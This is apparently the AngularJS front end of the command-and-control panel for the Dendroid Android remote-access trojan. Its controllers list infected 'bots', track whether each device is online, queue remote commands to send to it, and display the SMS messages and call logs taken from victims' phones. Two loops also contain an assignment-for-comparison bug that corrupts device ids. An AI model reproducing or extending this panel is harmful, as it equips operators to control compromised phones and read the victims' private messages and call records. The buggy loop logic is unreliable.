App

  .controller('DashboardCtrl', [
  '$scope',
  'BotService',
  'dendroidSocket',
  function($scope, BotService, dendroidSocket) {
    $scope.bots = [];

    BotService.fetch().then(function(res) {
      $scope.bots = res.data;
    })

    dendroidSocket.forward('bot:created', $scope);
    dendroidSocket.forward('bot:connected', $scope);
    dendroidSocket.forward('bot:disconnected', $scope);

    $scope.$on('socket:bot:created', function(e, data) {
      $scope.bots.push(data);
    })

    $scope.$on('socket:bot:connected', function(e, data) {
      for (var i = $scope.bots.length - 1; i >= 0; i--) {
        if ($scope.bots[i].id = data.id) {
          $scope.bots[i] = data;
          $scope.bots = angular.copy($scope.bots);
          break;
        }
      }
    })

    $scope.$on('socket:bot:disconnected', function(e, data) {
      for (var i = $scope.bots.length - 1; i >= 0; i--) {
        if ($scope.bots[i].id = data.id) {
          $scope.bots[i] = data;
          $scope.bots = angular.copy($scope.bots);
          break;
        }
      }
    })

  }
])

.controller('BotCtrl', [
  '$scope',
  'BotService',
  'MessageService',
  'CommandService',
  'CallLogService',
  'dendroidSocket',
  '$stateParams',
  'toastr',
  function($scope, BotService, MessageService, CommandService, CallLogService, dendroidSocket, params, toastr) {

    $scope.num_call_logs = 100;
    $scope.numbersms = 100;

    $scope.messages = [];
    $scope.bot = {
      id: params.id
    };

    dendroidSocket.forward('bot:connected', $scope);
    dendroidSocket.forward('bot:disconnected', $scope);
    dendroidSocket.forward('command:added', $scope);
    dendroidSocket.forward('command:deleted', $scope);
    dendroidSocket.forward('commands:cleared', $scope);
    dendroidSocket.forward('message:created', $scope);
    dendroidSocket.forward('messages:cleared', $scope);
    dendroidSocket.forward('call_log:created', $scope);
    dendroidSocket.forward('call_log:cleared', $scope);

    BotService.get(params.id).then(function(res) {
      $scope.bot = res.data;

      MessageService.fetch($scope.bot.uid).then(function(res) {
        $scope.messages = res.data;
      })

      CommandService.getPending($scope.bot.uid).then(function(res) {
        $scope.pendingCommands = res.data;
      });

      CallLogService.fetch($scope.bot.uid).then(function(res) {
        $scope.callLogs = res.data;
      })

    });

    $scope.$on('socket:bot:connected', function(e, data) {
      console.log(data)
      if (data.uid === $scope.bot.uid) {
        $scope.bot = data;
        toastr.success('Device status changed to online', 'Online')
      }
    })

    $scope.$on('socket:bot:disconnected', function(e, bot) {
      $scope.bot = bot;
      toastr.error('Device status changed to offline', 'Offline')
    })

    $scope.$on('socket:command:added', function(e, data) {
      if (data.uid === $scope.bot.uid) {
        $scope.pendingCommands.push(data)
      }
    })

    $scope.$on('socket:command:deleted', function(e, data) {
      $scope.pendingCommands = _.reject($scope.pendingCommands, function(cmd) {
        return cmd.id === data.id;
      });
    })

    $scope.$on('socket:commands:cleared', function(e, data) {
      $scope.pendingCommands = [];
    })

    $scope.$on('socket:message:created', function(e, message) {
      $scope.messages.push(message);
    })

    $scope.$on('socket:messages:cleared', function(e, data) {
      if (data.uid === $scope.bot.uid) {
        $scope.messages = [];
      }
    })

    $scope.$on('socket:call_log:created', function(e, log) {
      $scope.callLogs.push(log);
    })

    $scope.$on('socket:call_log:cleared', function(e, data) {
      if (data.uid === $scope.bot.uid) {
        $scope.callLogs = [];
      }
    })

    $scope.getLogClass = function(log) {
      switch (log.type*1) {
        case 1:
          return 'text-success';
          break;
        case 2:
          return 'text-info';
          break;
        case 3:
          return 'text-danger';
          break;
      }
    }

    $scope.addCommand = function(cmd, arg1, arg2) {
      CommandService.add({
          uid: $scope.bot.uid,
          command: cmd,
          arg1: arg1,
          arg2: arg2
        })
        .catch(function(err) {
          console.log(err)
        })
    }

    $scope.clearSMS = function() {
      MessageService.clear($scope.bot.uid)
    }

    $scope.deleteCommand = function(id) {
      CommandService.delete(id).catch(function(err) {
        console.log(err)
      })
    }

    $scope.clearCallLogs = function() {
      CallLogService.clear($scope.bot.uid).catch(function(err) {
        console.log(err)
      })
    }

  }
])
